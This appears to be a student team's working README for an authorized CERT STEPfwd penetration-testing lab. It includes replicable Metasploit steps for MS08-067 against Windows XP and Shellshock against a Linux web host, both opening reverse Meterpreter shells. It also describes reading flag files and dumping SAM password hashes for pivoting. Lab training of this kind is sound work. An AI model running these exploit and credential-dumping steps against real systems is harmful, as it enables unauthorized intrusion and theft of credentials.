# A_Rocha — personal work folder

## Where to start (STEPfwd)

<table>
<tr valign="top">
<td width="62%">

If you forgot how to open the lab environment:

<ol>
<li>Log in to <strong>STEPfwd</strong> (CERT Simulation, Training &amp; Exercise platform — CMU Software Engineering Institute).</li>
<li>Open the <strong>Exercises</strong> tab (not Curriculums or Bookmarks).</li>
<li>Under Exercises, keep <strong>Exercises</strong> selected (not <strong>On Demand Labs</strong>).</li>
<li>Find the row <strong>Exercise: EPT</strong>, <strong>Session: Session 1</strong>, <strong>Team: Team_6</strong> (confirm session/team with the instructor if labels change).</li>
<li>Click <strong>Connect</strong> (the link on the right, highlighted in yellow in the screenshot) to launch the exercise and reach your assigned <strong>Kali</strong> VM.</li>
</ol>

<p><strong>This folder:</strong> use <a href="work/"><code>work/</code></a> as the index. Each scoped IP folder — <a href="work/10.20.160.100/"><code>work/10.20.160.100/</code></a>, <a href="work/10.20.160.101/"><code>work/10.20.160.101/</code></a>, <a href="work/10.20.160.102/"><code>work/10.20.160.102/</code></a>, <a href="work/10.20.160.124/"><code>work/10.20.160.124/</code></a>, and <a href="work/10.20.160.103/"><code>work/10.20.160.103/</code></a> — has <code>README.md</code> (full runbook), <code>attack_plan/README.md</code> (phased attack plan), <code>Screenshots/</code>, <code>credential_pivot.md</code>, and <code>unfruitful_attempts/README.md</code> (dead-end log with embedded screenshots). <a href="work/unfruitful_attempts/"><code>work/unfruitful_attempts/</code></a> is the cross-host index. Shared images (STEPfwd, <code>.124</code>, Nessus) stay in <a href="Screenshots/"><code>Screenshots/</code></a>. Evidence names: <code>102-NNN_…</code>, <code>101-NNN_…</code>, <code>100-NNN_…</code> — see <a href="work/README.md"><code>work/README.md</code></a>. Promote finals to <a href="../1_Screenshots/"><code>1_Screenshots/</code></a> when report-ready.</p>

</td>
<td width="38%" align="center">

<img src="Screenshots/stepfwd_connect_team6.png" width="280" alt="STEPfwd dashboard: Exercises tab, EPT Session 1, Team_6, yellow Connect link"/>

<p><small>STEPfwd UI (scaled for README)</small></p>

</td>
</tr>
</table>

**Plan of attack (index + per-IP folders):** [`work/README.md`](work/README.md) → [`work/10.20.160.100/README.md`](work/10.20.160.100/README.md), [`work/10.20.160.101/README.md`](work/10.20.160.101/README.md), [`work/10.20.160.102/README.md`](work/10.20.160.102/README.md), [`work/10.20.160.124/README.md`](work/10.20.160.124/README.md), [`work/10.20.160.103/README.md`](work/10.20.160.103/README.md)

---

## Host_Discovery (master)

**Edit with the team and keep in sync with the root README host table:**

[Host_Discovery — Google Sheet](https://docs.google.com/spreadsheets/d/1J3H6ee8N06ROz1l4pcgxclArq5TN4sk3kIPbHPTCj3A/edit?usp=sharing)

**Default rule:** everyone should own **at least three** IPs in the lab range. You can **trade** hosts by updating the sheet, then mirror changes in [root `README.md`](../README.md) and each affected teammate’s `README.md`.

**Your Kali VM:** **KALI6** (same as PWN2). Use this machine for scans, exploits, and listeners so teammates do not overwrite each other’s work.

**Your responsibilities:** **Coordination** and **synchronization** across the team (deadlines, Host_Discovery sheet, repo hygiene, handoffs—pair with **H_Padilla**).

| Teammate | Kali VM | Responsibilities |
|----------|---------|------------------|
| J_Solis | **KALI1** | Presentation & submission |
| T_Amor | **KALI2** | Presentation & submission |
| H_Padilla | **KALI3** | Coordination & synchronization |
| R_White | **KALI4** | Written report & submission |
| B_Drummond | **KALI5** | Written report & submission |
| A_Rocha | **KALI6** | Coordination & synchronization |

---

## Your hosts (you are responsible for these by default)

| Exploited? | IP | Ports | Network mapping scan | Vulnerability scan |
|------------|-----|-------|----------------------|--------------------|
| Exploited | `10.20.160.102` | 80; 443; 8080 | Complete | Complete |
| | `10.20.160.101` | 135; 139; 445; 49152; 49153; 49154; 49155; 49217; 49222 | | |
| Exploited | `10.20.160.100` | 139; 445 | Complete | Complete |

---

## Replicable exploit paths (your wins)

### `10.20.160.100` (Windows XP) — SMB `ms08_067_netapi`

**Primary vulnerability / attack path**
- XP-era SMB stack vulnerability aligned with **MS08-067**; null SMB enum was unreliable, but exploit path still landed.

**Replicable command flow**
```text
msfconsole -q
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 10.20.160.100
set LHOST <KALI_LAB_IP>
set LPORT 4444
set PAYLOAD windows/meterpreter/reverse_tcp
check
run
```

**Post-ex / proof capture**
```text
meterpreter > sysinfo
meterpreter > getuid
meterpreter > search -f proof.txt
meterpreter > shell
C:\> type "c:\Documents and Settings\Barbara\Desktop\proof.txt"
```

**Evidence / proof screenshots**
- Exploit session opened: [`100-003`](work/10.20.160.100/Screenshots/100-003_msf_ms08_067_netapi_meterpreter_session_tm6_afrocha.png)
- Host + SYSTEM context: [`100-004`](work/10.20.160.100/Screenshots/100-004_meterpreter_sysinfo_system_shell_echo_tm6_afrocha.png)
- Proof path found (`proof.txt`): [`100-005`](work/10.20.160.100/Screenshots/100-005_meterpreter_search_proof_txt_barbara_desktop_tm6_afrocha.png)
- `proof.txt` read in shell: [`100-006`](work/10.20.160.100/Screenshots/100-006_meterpreter_type_unknown_shell_cmd_proof_tm6_afrocha.png)
- End-to-end capture: [`100-008`](work/10.20.160.100/Screenshots/100-008_ms08_067_session4_sysinfo_shell_proof_txt_tm6_afrocha.png)

### `10.20.160.102` (Linux / dotProject) — Shellshock + Meterpreter

**Primary vulnerabilities / best attack path**
- Web stack exposed **Shellshock-compatible CGI** lane (working `TARGETURI` path on this host).
- DotProject **RFI** path also validated and useful for report narrative.

**Replicable command flow (Shellshock win)**
```text
msfconsole -q
search type:exploit platform:linux cgi_bash
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS 10.20.160.102
set RPORT 80
set TARGETURI /cgi-bin/test-cgi
set LHOST <KALI_LAB_IP>
set LPORT 4444
set PAYLOAD linux/x86/meterpreter/reverse_tcp
run
```

**Post-ex / local flag capture**
```text
meterpreter > sysinfo
meterpreter > getuid
meterpreter > shell
$ cd ~
$ cd Desktop
$ cat local.txt
```

**Evidence / local flag screenshots**
- Exploit config + run (`targeturi /cgi-bin/test-cgi`): [`102-011`](work/10.20.160.102/Screenshots/102-011_msf_search_apache_mod_cgi_bash_env_set_targeturi_test_cgi_run_tm6_afrocha.png)
- Meterpreter session + `sysinfo/getuid`: [`102-012`](work/10.20.160.102/Screenshots/102-012_msf_shellshock_meterpreter_session5_sysinfo_getuid_shell_afrocha_tm6_afrocha.png)
- Earlier successful session capture: [`102-009`](work/10.20.160.102/Screenshots/102-009_msf_shellshock_apache_mod_cgi_meterpreter_sysinfo_shell_elara_tm6_afrocha.png)
- `local.txt` read from `~/Desktop`: [`102-010`](work/10.20.160.102/Screenshots/102-010_shell_meterpreter_home_desktop_cat_local_txt_afrocha_tm6_afrocha.png)
- RFI proof for supporting narrative: [`102-004`](work/10.20.160.102/Screenshots/102-004_rfi_proof_txt_body_PROOF_tm6_afrocha.png)

---

## Nessus — my hosts (specs + findings)

Scans were run as **Final_Systems_Project**. Raw screenshots: [`Screenshots/vulnerabilities/`](Screenshots/vulnerabilities/).

### `10.20.160.102` (Linux)

**Host details (from scan sidebar)**

| Field | Value |
|-------|--------|
| **IP** | 10.20.160.102 |
| **OS** | Linux Kernel 2.6 |
| **Scan start** | 7:41 PM |
| **Scan end** | 7:59 PM |
| **Elapsed** | 18 minutes |

**Findings (overview)** — Nessus reported **28** plugin rows for this host (see screenshot for full list). Notable severities include:

| Severity | Vulnerability (summary) | Family | Count (per table) |
|----------|-------------------------|--------|-------------------|
| Critical | GNU Bash Environment Variable Handling Code Injection (**Shellshock**) | CGI abuses | 2 |
| Critical | **SSL Version 2 and 3** Protocol Detection | Service detection | 1 |
| Mixed | SSL (multiple issues) | General | 12 |
| Mixed | IETF MD5 (multiple issues) | General | 2 |
| Mixed | TLS (multiple issues) | Misc. | 2 |
| Medium | HTTP **TRACE / TRACK** Methods Allowed | Web servers | 2 |
| Medium | Multiple Web Server **printenv** CGI Information Disclosure | CGI abuses | 2 |
| Medium | SSL **DROWN** Attack Vulnerability | Misc. | 1 |
| Medium | **TLS 1.0** Protocol Detection | Service detection | 1 |
| Low | SSL/TLS **Logjam** (DH ≤ 1024 bits) | Misc. | 1 |
| Info | HTTP, PHP, Service Detection, etc. | (various) | (see export) |

![Nessus: 10.20.160.102](Screenshots/vulnerabilities/nessus_10_20_160_102.png)

---

### `10.20.160.101` (Windows 7)

**Host details (from scan sidebar)**

| Field | Value |
|-------|--------|
| **IP** | 10.20.160.101 |
| **MAC** | 00:50:56:86:4F:A2 |
| **OS** | Microsoft Windows 7 Ultimate |
| **Scan start** | 7:41 PM |
| **Scan end** | 8:00 PM |
| **Elapsed** | 18 minutes |

**Findings (overview)** — **44** total findings (donut: Critical **1**, Medium **2**, Low **2**, Info **39**). Examples from the top of the table:

| Severity | Vulnerability (summary) | Family | Count |
|----------|-------------------------|--------|-------|
| Critical | **SSL Version 2 and 3** Protocol Detection | Service detection | 1 |
| Medium | **RDP** Server Man-in-the-Middle Weakness | General | 1 |
| Medium | SSL **DROWN** Attack Vulnerability | Misc. | 1 |
| Low | SSL/TLS **Logjam** (DH ≤ 1024 bits) | Misc. | 1 |
| Low | Terminal Services encryption **not FIPS-140** compliant | Misc. | 1 |
| Info | DNS hostnames, CPE, device type, Ethernet MAC vendor, **FTP** server detection, etc. | (various) | (see export) |

![Nessus: 10.20.160.101](Screenshots/vulnerabilities/nessus_10_20_160_101.png)

---

### `10.20.160.100` (Windows XP)

**Host details (from scan sidebar)**

| Field | Value |
|-------|--------|
| **IP** | 10.20.160.100 |
| **OS** | Microsoft Windows XP **Service Pack 2**; Microsoft Windows XP **Service Pack 3**; Windows XP for Embedded Systems |
| **Scan start** | 7:41 PM |
| **Scan end** | 7:52 PM |
| **Elapsed** | 11 minutes |

**Findings (overview)** — **20** total findings. Highlights from the table:

| Severity | Vulnerability (summary) | Family | Count |
|----------|-------------------------|--------|-------|
| Mixed | Microsoft Windows (**multiple issues**) | Windows | 7 |
| Critical | Microsoft Windows XP **Unsupported Installation** Detection | Windows | 1 |
| Mixed | Microsoft Windows (multiple issues) | Misc. | 2 |
| Mixed | **SMB** (multiple issues) | Misc. | 2 |
| Medium | **RDP** Server Man-in-the-Middle Weakness | General | 1 |
| Low | Terminal Services encryption **not FIPS-140** compliant | Misc. | 1 |
| Info | SMB (multiple issues), Nessus SYN scanner, CPE, device type, patch/OS notes, RDP screenshot, etc. | (various) | (see export) |

**Attack-surface takeaway:** End-of-life **Windows XP** plus **SMB** and **RDP**-related findings are the main story for validation in the lab.

**What we ran (path to compromise):** **`enum4linux -a`** first — **null SMB** and **NetBIOS** did not cooperate on this run ([**`100-001`**](work/10.20.160.100/Screenshots/100-001_enum4linux_null_session_denied_no_nbtstat_tm6_afrocha.png)), so we leaned on **`nmap`** / **MSF** instead of anonymous share lists. **EternalBlue** tooling still produced noisy **`check`** output (including a **`:135`** timeout — [**`100-002`**](work/10.20.160.100/Screenshots/100-002_msf_ms17_010_check_135_timeout_still_vulnerable_tm6_afrocha.png)), but the **right lane for XP SP3** was **`exploit/windows/smb/ms08_067_netapi`** with **`windows/meterpreter/reverse_tcp`** and a reachable **`LHOST`** on the lab net — [**`100-003`**](work/10.20.160.100/Screenshots/100-003_msf_ms08_067_netapi_meterpreter_session_tm6_afrocha.png).

**What we did post-ex:** **`sysinfo` / `getuid`** showed **ADRASTEA**, workgroup **JUPITER**, **x86**, and **`NT AUTHORITY\SYSTEM`** ([**`100-004`**](work/10.20.160.100/Screenshots/100-004_meterpreter_sysinfo_system_shell_echo_tm6_afrocha.png)). **`search -f proof.txt`** located the flag at **`c:\Documents and Settings\Barbara\Desktop\proof.txt`** ([**`100-005`**](work/10.20.160.100/Screenshots/100-005_meterpreter_search_proof_txt_barbara_desktop_tm6_afrocha.png)). We read it with **`shell`** + **`type "…\proof.txt"`** (and a dated stamp); **`type`** is **cmd**, not Meterpreter — [**`100-006`**](work/10.20.160.100/Screenshots/100-006_meterpreter_type_unknown_shell_cmd_proof_tm6_afrocha.png). As **SYSTEM**, **`hashdump`** pulled **local SAM** (**LM/NTLM**) for **Administrator**, **Barbara**, and built-in accounts — [**`100-007`**](work/10.20.160.100/Screenshots/100-007_meterpreter_hashdump_sam_tm6_afrocha.png). Use **`cat`** or **`download`** from Meterpreter if you want the same content without **`shell`** (see [`work/10.20.160.100/README.md`](work/10.20.160.100/README.md)); keep raw **hash** lines out of committed markdown.

**What we learned:** (1) **Match the exploit to the OS** — **`ms08_067`** for **XP SMB**; do not drive **`ms17_010_eternalblue`** with a **Win7 x64** target on **XP**. (2) **Failed null enum ≠ “host dead”** — unauthenticated **SMB** exploits can still land if the build is vulnerable. (3) **Meterpreter ≠ `cmd.exe`** — **`echo`/`type`** behavior differs; paths must be **`Documents and Settings`** (**and**, not **`&`**). (4) **SYSTEM ⇒ `hashdump`** for **local cred material** to support **pivot** (e.g. toward **`.101`** in **JUPITER**), subject to **ROE** and team handling of secrets.

Full command playbook: [`work/README.md`](work/README.md) → [`work/10.20.160.100/README.md`](work/10.20.160.100/README.md). Evidence PNGs (**`100-001`…`100-009`**) live under [`work/10.20.160.100/Screenshots/`](work/10.20.160.100/Screenshots/).

![Nessus: 10.20.160.100](Screenshots/vulnerabilities/nessus_10_20_160_100.png)

---

## Checkpoints (CP)

| CP | Gate |
|----|------|
| CP0 | Setup: authorized scope, folder habit, confirm or swap IP ownership with team |
| CP1 | Discovery: your rows + sheet + root README stay aligned |
| CP2 | Mapping: services, attack surface, ruled-out paths for your IPs |
| CP3 | Exploitation: attempts documented (success or failure) |
| CP4 | Proof: `local.txt` / `proof.txt` (or equivalent) or explicit “blocked” |
| CP5 | Lateral / pivot if in scope; never commit secrets |
| CP6 | Report: hand figures and narrative snippets to integrator |
| CP7 | Submit: final checklist and rubric pass |

**Track here (GitHub checkboxes):**

- [ ] CP0 — Setup / ownership clear
- [ ] CP1 — Discovery updated for my IPs
- [ ] CP2 — Mapping notes for my IPs
- [ ] CP3 — Exploitation attempts logged
- [ ] CP4 — Proof or documented block
- [ ] CP5 — Lateral / pivot (if applicable)
- [ ] CP6 — Report handoff done
- [ ] CP7 — Submit-ready

